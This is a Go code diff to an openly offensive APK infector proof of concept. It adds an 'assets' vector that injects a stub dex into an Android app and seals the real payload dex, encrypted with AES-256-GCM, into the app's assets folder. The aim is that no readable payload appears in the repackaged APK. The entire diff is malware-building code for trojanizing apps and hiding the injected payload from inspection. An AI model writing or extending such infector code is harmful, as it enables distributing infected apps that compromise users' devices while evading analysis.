@@ -12,6 +12,7 @@ import (
 	"strings"
 
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/assetpayload"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/nativepatch"
 )
@@ -24,6 +25,10 @@ var payload_provider_name, _ = filepath.Abs("payload_provider.dex")
 var payload_trampoline_name, _ = filepath.Abs("payload_trampoline.dex")
 var payload_receiver_name, _ = filepath.Abs("payload_receiver.dex")
 var payload_appfactory_name, _ = filepath.Abs("payload_appfactory.dex")
+var payload_assets_name, _ = filepath.Abs("payload_assets.dex")
+
+// The dex that gets sealed into assets/ instead of being injected as classesN.dex.
+var payload_assets_dyn_name, _ = filepath.Abs("assets_payload/dyn_payload.dex")
 var frida_gadget_path_arm64, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "arm64-v8a", os.PathSeparator, "libfrida-gadget.so"))
 var frida_gadget_path_arm, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "armeabi-v7a", os.PathSeparator, "libfrida-gadget.so"))
 var frida_gadget_path_x86, _ = filepath.Abs(fmt.Sprintf("%s%c%s%c%s%c%s", zipOutput, os.PathSeparator, "lib", os.PathSeparator, "x86", os.PathSeparator, "libfrida-gadget.so"))
@@ -139,10 +144,10 @@ func Inject(path string, zipModifiedOutput string) {
 	log.Printf("max classes dex index = %d", max)
 	max += 1
 
-	if utils.Payload_option == int(utils.Provider_payload) || utils.Payload_option == int(utils.Trampoline_payload) || utils.Payload_option == int(utils.Receiver_payload) || utils.Payload_option == int(utils.AppComponentFactory_payload) {
-		// Provider / trampoline / receiver / app-component-factory vectors: no
-		// Application hijack, no final-modifier patch, no frida gadget. Just
-		// inject the payload dex.
+	if utils.Payload_option == int(utils.Provider_payload) || utils.Payload_option == int(utils.Trampoline_payload) || utils.Payload_option == int(utils.Receiver_payload) || utils.Payload_option == int(utils.AppComponentFactory_payload) || utils.Payload_option == int(utils.Assets_payload) {
+		// Provider / trampoline / receiver / app-component-factory / assets
+		// vectors: no Application hijack, no final-modifier patch, no frida
+		// gadget. Just inject the stub dex.
 		var payloadNewName = "classes" + strconv.Itoa(max) + ".dex"
 		var src string
 		switch utils.Payload_option {
@@ -152,11 +157,19 @@ func Inject(path string, zipModifiedOutput string) {
 			src = payload_trampoline_name
 		case int(utils.AppComponentFactory_payload):
 			src = payload_appfactory_name
+		case int(utils.Assets_payload):
+			src = payload_assets_name
 		default:
 			src = payload_receiver_name
 		}
 		copy(src, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, payloadNewName))
 		log.Printf("Successfuly injected DEX: %s", payloadNewName)
+
+		if utils.Payload_option == int(utils.Assets_payload) {
+			// The real payload never becomes a classesN.dex: it is sealed into
+			// assets/ and only the stub above knows how to open it.
+			sealAssetsPayload(zipOutput)
+		}
 	} else {
 		// patch out Application final modifier
 		for _, path := range files {
@@ -201,6 +214,38 @@ func Inject(path string, zipModifiedOutput string) {
 	fmt.Println("	--zipping...")
 	ZipWriter(zipModifiedOutput)
 
+}
+
+// sealAssetsPayload encrypts the payload dex into assets/<AssetName> inside the
+// unzipped APK tree. The stub dex reads it back at runtime; nothing lands in the
+// APK in readable form (see pkg/assetpayload for the format and its limits).
+func sealAssetsPayload(zipOutput string) {
+	payloadDex := os.Getenv("ARCHINOME_ASSETS_DEX")
+	if payloadDex == "" {
+		payloadDex = payload_assets_dyn_name
+	}
+	passphrase := os.Getenv("ARCHINOME_ASSETS_KEY")
+	if passphrase == "" {
+		passphrase = assetpayload.DefaultPassphrase
+	} else if passphrase != assetpayload.DefaultPassphrase {
+		log.Printf("WARNING: ARCHINOME_ASSETS_KEY differs from the passphrase compiled into the loader")
+		fmt.Println("\t--WARNING: custom passphrase set, but the compiled loader uses the default one")
+	}
+
+	assetDir := filepath.Join(zipOutput, "assets")
+	if err := os.MkdirAll(assetDir, 0o755); err != nil {
+		log.Panic("Failed to create the assets directory: ", err)
+	}
+	dst := filepath.Join(assetDir, assetpayload.AssetName)
+	if err := assetpayload.EncryptFile(payloadDex, dst, passphrase); err != nil {
+		log.Panic("Failed to seal the payload into assets/: ", err)
+	}
+	info, err := os.Stat(dst)
+	if err != nil {
+		log.Panic("Failed to stat the sealed asset: ", err)
+	}
+	log.Printf("Sealed %s -> %s (%d bytes)", payloadDex, assetpayload.AssetPath, info.Size())
+	fmt.Printf("\t--sealed payload: %s (%d bytes, AES-256-GCM)\n", assetpayload.AssetPath, info.Size())
 }
 
 func ZipWriter(zipModifiedOutput string) {
